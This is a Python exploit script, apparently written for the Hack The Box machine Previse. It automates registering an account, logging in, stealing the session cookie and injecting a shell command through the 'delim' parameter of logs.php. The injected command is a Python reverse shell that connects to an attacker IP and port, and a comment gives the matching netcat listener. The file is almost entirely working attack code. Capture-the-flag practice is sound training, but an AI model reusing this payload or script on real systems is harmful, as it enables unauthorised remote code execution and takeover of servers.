#!/usr/bin/python3

import requests
import re
import random
import string
import pyfiglet
from colorama import Fore, Back, Style

def banner(text="autopwn"):
    print(Fore.RED + pyfiglet.figlet_format(text, font="banner"))
    print(Fore.GREEN + "[+] Author: @dugisan3rd")
    print("[+] Medium: Hack the Box")
    print("[+] Link: https://app.hackthebox.com/machines/373")
    print("[+] Machine: Previse")
    print("[+] Vulnerability: PHP exec() Remote Code Execution\n" + Style.RESET_ALL)

# change lhost and lport
# set up listener: nc -nvlp 10.10.14.26 9999
LHOST = "10.10.14.26"
LPORT = 9999

url_createUser = "http://10.10.11.104/accounts.php"
url_login = "http://10.10.11.104/login.php"
url_exploit = "http://10.10.11.104/logs.php"

def generateCred(size = 5, chars = string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def createUser(url, cred):
    # cred = "dugisan3rd"
    print('[+] Creating user')
    userData = {"username" : cred, "password" : cred, "confirm" : cred, "submit": ""}
    r = requests.post(url, data = userData, allow_redirects = False)
    check = re.search("Success! User was added!", r.text)
    try:
        if check.group(0) != 0:
            print("[+] Success! User {0} was added!".format(cred))
    except:
        print("[+] Failed! User {0} is already taken!".format(cred))
        exit()

def login(url, cred):
    print("[+] Attempting login as user {0}".format(cred))
    userData = {"username" : cred, "password" : cred}
    r = requests.post(url, data = userData, allow_redirects = False)
    check = re.search("Invalid Username or Password", r.text)
    try:
        if check.group(0) != 0:
            print("[+] Failed! Invalid username or/and password")
    except:
        checkCookie = re.search("PHPSESSID=(.*? )", str(r.cookies))
        # print(biskut.group(0).strip(" "))
        userCookie = checkCookie.group(1).strip(" ")
        print("[+] Success! Capturing cookie PHPSESSID:{0}".format(userCookie))
        return userCookie

def exploit(url, userCookie, rhost, rport):
    payload = {"delim": ";python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'".format(LHOST, LPORT)}
    cookie = dict(PHPSESSID = userCookie)
    print("[+] Send reverse shell to {0}:{1}".format(rhost,rport))
    print("[+] Exploiting. Please check yout listener!")
    r = requests.post(url, cookies=cookie, data=payload)

def main():
    banner()
    cred = generateCred()
    createUser(url_createUser, cred)
    userCookie = login(url_login, cred)
    exploit(url_exploit, userCookie, LHOST, LPORT)
    

if __name__ == "__main__":
    main()